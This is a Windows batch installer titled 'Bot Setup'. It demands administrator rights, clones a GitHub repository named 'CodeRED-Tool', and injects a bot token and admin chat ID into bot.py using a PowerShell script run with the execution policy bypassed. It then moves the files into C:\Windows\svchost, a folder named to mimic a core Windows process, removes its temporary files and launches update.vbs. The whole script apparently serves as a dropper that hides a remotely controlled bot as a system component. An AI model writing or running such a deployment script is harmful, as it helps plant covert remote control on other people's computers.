@echo off
setlocal EnableDelayedExpansion
title Bot Setup

:: ============================================
::   YOUR REPO URL
:: ============================================
set "REPO_URL=https://github.com/Jayasankha-dev/CodeRED-Tool.git"

:: ============================================

echo ============================================
echo    Bot Deployment Script
echo ============================================
echo.

:: --- Check Admin ---
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Administrator rights required!
    echo     Right-click this file -^> "Run as administrator"
    pause
    exit /b 1
)

:: --- Check Git ---
where git >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Git is not installed.
    pause
    exit /b 1
)

:: --- Ask Token & Chat ID ---
echo.
set /p BOT_TOKEN="Bot Token     : "
set /p CHAT_ID="Admin Chat ID : "
echo.

if "%BOT_TOKEN%"=="" (
    echo [!] Token cannot be empty.
    pause
    exit /b 1
)
if "%CHAT_ID%"=="" (
    echo [!] Chat ID cannot be empty.
    pause
    exit /b 1
)

:: --- Clone ---
set "TEMP_DIR=%TEMP%\bot_clone_%RANDOM%"
echo [*] Cloning repository...
git clone "%REPO_URL%" "%TEMP_DIR%"
if not exist "%TEMP_DIR%\.git" (
    echo [!] Clone failed. Check the URL / internet.
    pause
    exit /b 1
)
echo [OK] Cloned

:: --- Update bot.py ---
set "BOT_FILE=%TEMP_DIR%\bot.py"
if not exist "%BOT_FILE%" (
    echo [!] bot.py not found in repo root!
    pause
    exit /b 1
)

echo [*] Updating bot.py ...

set "PS_SCRIPT=%TEMP%\replace_%RANDOM%.ps1"
(
echo $path = '%BOT_FILE%'
echo $token = '%BOT_TOKEN%'
echo $chatid = '%CHAT_ID%'
echo $c = Get-Content -Raw -Path $path
echo $c = $c -replace 'TOKEN\s*=\s*"Anonymous"', ('TOKEN = "' + $token + '"'^)
echo $c = $c -replace 'ADMIN_CHAT_ID\s*=\s*"Anonymous"', ('ADMIN_CHAT_ID = "' + $chatid + '"'^)
echo Set-Content -Path $path -Value $c -Encoding UTF8
) > "%PS_SCRIPT%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_SCRIPT%"
del "%PS_SCRIPT%" >nul 2>&1

:: Verify
findstr /C:"Anonymous" "%BOT_FILE%" >nul
if %errorLevel% equ 0 (
    echo [!] WARNING: "Anonymous" still in bot.py
    echo     Check: TOKEN = "Anonymous"  ^&  ADMIN_CHAT_ID = "Anonymous"
) else (
    echo [OK] bot.py updated
)

:: --- Move to C:\Windows\svchost ---
set "TARGET_DIR=C:\Windows\svchost"
echo [*] Copying to %TARGET_DIR% ...

if exist "%TARGET_DIR%" rmdir /s /q "%TARGET_DIR%"

robocopy "%TEMP_DIR%" "%TARGET_DIR%" /E /MOVE /NFL /NDL /NJH /NJS /NP >nul

if not exist "%TARGET_DIR%\bot.py" (
    echo [!] Copy failed.
    pause
    exit /b 1
)
echo [OK] Files copied

if exist "%TEMP_DIR%" rmdir /s /q "%TEMP_DIR%" >nul 2>&1

:: --- Launch update.vbs ---
echo [*] Launching update.vbs ...
if exist "%TARGET_DIR%\update.vbs" (
    start "" "%TARGET_DIR%\update.vbs"
    echo [OK] update.vbs launched
) else (
    echo [!] update.vbs NOT FOUND in %TARGET_DIR%
)

echo.
echo ============================================
echo   DONE!  Location: %TARGET_DIR%
echo ============================================
pause